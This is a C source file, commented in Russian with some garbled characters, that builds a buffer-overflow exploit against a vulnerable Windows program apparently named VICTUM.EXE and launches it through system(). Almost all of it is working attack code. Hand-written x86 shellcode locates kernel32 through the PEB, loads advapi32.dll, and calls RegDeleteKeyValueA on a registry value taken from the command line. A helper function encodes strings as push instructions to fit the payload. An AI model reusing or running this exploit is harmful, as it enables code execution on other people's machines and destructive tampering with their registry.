#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>

char* start = "1234\x91\xDF\x13\x76\x33\xC9\x64\x8B"           //«агружает билиотеки kernel
"\x41\x30\x8B\x40\x0C\x8B\x70\x14\xAD\x96\xAD\x8B\x58\x10\x8B" // остаетс€ посто€нный
"\x53\x3C\x03\xD3\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03\xF3\x33"
"\xC9\x41\xAD\x03\xC3\x81\x38\x47\x65\x74\x50\x75\xF4\x81\x78"
"\x04\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72\x65\x75"
"\xE2\x8B\x72\x24\x03\xF3\x66\x8B\x0C\x4E\x49\x8B\x72\x1C\x03"
"\xF3\x8B\x14\x8E\x03\xD3\x33\xC9\x53\x52\x51\x68\x61\x72\x79"
"\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F\x61\x64\x54\x53\xFF\xD2"
"\x83\xC4\x0C\x59\x50\x51\x68\x2E\x64\x6C\x6C\x68\x70\x69\x33"
"\x32\x68\x41\x64\x76\x61\x54\xFF\xD0\x83\xC4\x10\x8B\x54\x24"
"\x04\x33\xC9\x51\x33\xC9\x66\xB9\x65\x41\x51\x68\x56\x61\x6C"
"\x75\x68\x65\x4B\x65\x79\x68\x65\x6C\x65\x74\x68\x52\x65\x67"
"\x44\x54\x50\xFF\xD2\x83\xC4\x14";

/*"\x68\x56\x61\x6C\x61\x83\x6C"
"\x24\x03\x61\x68\x54\x65\x73\x74\xB9\x65\x6E\x74\x61\x51\x83"
"\x6C\x24\x03\x61\x68\x72\x6F\x6E\x6D\x68\x45\x6E\x76\x69"*/

char* push_pointer = "\x33\xC9\x8B\xCC\x83\xC1";    // пушит указатель на стек
/*"\x0C"*/

char* call_function = "\x51\x33\xC9\x8B\xCC\x83\xC1\x04\x51"   //вызвает функцию удалени€
"\x33\xC9\xB9\x02\xFF\xFF\x81\x81\xE9\x01\xFF\xFF\x01\x51\xFF"
"\xD0\x83\xC4";

/*"\x1C"*/

char* end = "\x5A\x5B\xB9\x65\x73\x73\x61\x51\x83\x6C\x24"      //нахождение ф-ии exit_procces и выход
"\x03\x61\x68\x50\x72\x6F\x63\x68\x45\x78\x69\x74\x54\x53\xFF"
"\xD2\x33\xC9\x51\xFF\xD0";

char* convert_string_to_shellcode(char* string) {
	int len = (int)strlen(string);
	char* shellcode = NULL;
	int remains = len % 4;
	int commands_count = len / 4;
	int i = 0;

	if (len < 4) {   //если длина меньше 4 то нужно дополнить до 4 и вычесть дополненное 
		shellcode = (char*)malloc(sizeof(char)*(1 + remains + 4 - remains + (4 - remains) * 5 + 1));
		if (shellcode == NULL) {
			return NULL;
		}
		shellcode[0] = '\x68'; // push
		i = 1;
		for (int j = 0; j < remains; i++, j++) {
			shellcode[i] = string[j]; //записываю в шелл код входные символы
		}
		for (int j = 0; j < 4 - remains; i++, j++) {
			shellcode[i] = '\x61'; // добавл€ю дополнительные буквы A
		}
		for (int j = 0; j < 4 - remains; j++) { //удал€ю добавленные буквы ј
			shellcode[i++] = '\x83'; // sub
			shellcode[i++] = '\x6C'; // dword ptr
			shellcode[i++] = '\x24'; // esp
			shellcode[i++] = (char)(3 - j);  // индекс удал€емой буквы
			shellcode[i++] = '\x61'; // A
		}
		shellcode[i] = 0;   // шелл код должен закончитьс€ нулем
		return shellcode;
	}
	if (remains == 0) { // если кратно четырем
		//нужно просто запушить ноль
		shellcode = (char*)malloc(sizeof(char) * (commands_count * 5 + 3 + 1));
		if (shellcode == NULL) {
			return NULL;
		}
		shellcode[0] = '\x33';		// xor
		shellcode[1] = '\xC9';		// ecx, ecx
		shellcode[2] = '\x51';	// push ecx
		i = 3;
	}
	else {										//push
		shellcode = (char*)malloc(sizeof(char) * (1 + remains + 4 - remains + (4 - remains) * 5 + commands_count * 5 + 1));
		if (shellcode == NULL) {
			return NULL;
		}
		shellcode[0] = '\x68'; // push
		i = 1;
		for (int j = 0; j < remains; i++, j++)
			shellcode[i] = string[commands_count * 4 + j];
		for (int j = 0; j < 4 - remains; i++, j++)
			shellcode[i] = '\x61'; // A
		for (int j = 0; j < 4 - remains; j++) {
			shellcode[i++] = '\x83'; // sub
			shellcode[i++] = '\x6C'; // dword ptr
			shellcode[i++] = '\x24'; // esp
			shellcode[i++] = (char)(3 - j);
			shellcode[i++] = '\x61'; // A
		}

	}
	for (int k = commands_count - 1; k >= 0; k--) { //запись в стек в обратном пор€дке по 4 байта
		shellcode[i++] = '\x68'; // push
		for (int j = 0; j < 4; j++, i++) {
			shellcode[i] = string[k * 4 + j];
		}
	}
	shellcode[i] = 0;
	return shellcode;
}

int size(int size) {
	if (size % 4 == 0) {
		return size + 4; // push 0x00000000 на стэк
	}
	return size + 4 - (size % 4);
}

char* build_shellcode(char* victum_app, int buffer_size, char* key, int key_len, char* value, int value_len) {
	size_t len = strlen(victum_app) + 1 // путь до файла и пробел
		+ 2 + buffer_size + // две кавычки + размер буфера (8)
		strlen(start) + strlen(key) + strlen(value) + strlen(push_pointer) + 1 + strlen(call_function) + strlen(end) + 1 + 1; // end character
	                   //путь до удал€емой папки и значение
	char* shellcode = (char*)malloc(sizeof(char) * len);
	if (shellcode == NULL) {
		return NULL;
	}

	int i = 0;
	for (int j = 0; j < (int)strlen(victum_app); i++, j++) {
		shellcode[i] = victum_app[j];               //путь до у€звимого файла
	}
	//shellcode[i++] = ' "';
	shellcode[i++] = '"';

	for (int j = 0; j < buffer_size; i++, j++) {
		shellcode[i] = 0xAA;    //начальное заполнение массива
	}
	for (int j = 0; j < (int)strlen(start); i++, j++) {
		shellcode[i] = start[j];
	}
	for (int j = 0; j < (int)strlen(value); i++, j++) {
		shellcode[i] = value[j];  
	}                                                  //записывает в шелл код параметры дл€ вызова функции RegeleteKeyValueA
	for (int j = 0; j < (int)strlen(key); i++, j++) {
		shellcode[i] = key[j];
	}
	for (int j = 0; j < (int)strlen(push_pointer); i++, j++) {
		shellcode[i] = push_pointer[j];  
	}
	shellcode[i++] = (char)key_len; 
	for (int j = 0; j < (int)strlen(call_function); i++, j++) {
		shellcode[i] = call_function[j];
	}
	shellcode[i++] = (char)(4 + key_len + 4 + value_len);
	for (int j = 0; j < (int)strlen(end); i++, j++)
		shellcode[i] = end[j];

	shellcode[i++] = '"';
	shellcode[i++] = 0;
	return shellcode;
}

void print_hex(const char* string)
{
	unsigned char* p = (unsigned char*)string;

	for (int i = 0; i < strlen(string); ++i) {
		printf("\\x%02x", p[i]);
	}
	printf("\n\n");
}


// VICTUM.EXE 8 Environment test
int main(int argc, char** argv) {
	char* victum_app = argv[1];   //путь до у€звимого файла
	int buffer_size = atoi(argv[2]);
	char* regestry_key = argv[3];//путь до ключа
	char* regestry_value = argv[4];//ключ

	char* key = convert_string_to_shellcode(regestry_key); // возвращает путь до ключа в байтовом представлении
	if (key == NULL) {
		printf("Can't allocate memory\n");
		return EXIT_FAILURE;
	}

	char* value = convert_string_to_shellcode(regestry_value);
	if (value == NULL) {
		printf("Can't allocate memory\n");
		return EXIT_FAILURE;
	}
	int size_for_registry_key = size((int)strlen(regestry_key));//размер занимаего места на стеке
	int size_for_registry_value = size((int)strlen(regestry_value));
	char* shellcode = build_shellcode(victum_app, buffer_size, key, size_for_registry_key, value, size_for_registry_value);
	if (shellcode == NULL) {
		printf("Can't allocate memory\n");
		return EXIT_FAILURE;
	}
	print_hex(shellcode + 12);
	UINT result_code = system(shellcode);

	free(key);
	free(value);
	free(shellcode);
	return EXIT_SUCCESS;
}